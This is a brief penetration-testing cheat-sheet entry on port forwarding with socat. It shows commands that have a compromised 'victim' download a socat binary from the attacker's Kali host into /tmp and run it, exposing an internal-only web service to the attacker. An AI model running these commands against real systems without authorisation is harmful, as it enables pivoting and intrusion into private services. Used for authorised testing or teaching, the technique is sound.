# Tunneling and Port Forwarding

## Socat

If there is a website running on port 6666 that can only be seen on the Victims side locally, we can forward it so we can see it on Kali. Below will allows us to see the website on our Kali instance on port 7777

**Kali**

```
wget https://github.com/aledbf/socat-static-binary/releases/download/v0.0.1/socat-linux-amd64
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd /tmp
wget http://$KALI:81/socat-linux-amd64
chmod +x socat-linux-amd64 
./socat-linux-amd64  tcp-listen:7777,reuseaddr,fork tcp:localhost:6666
```
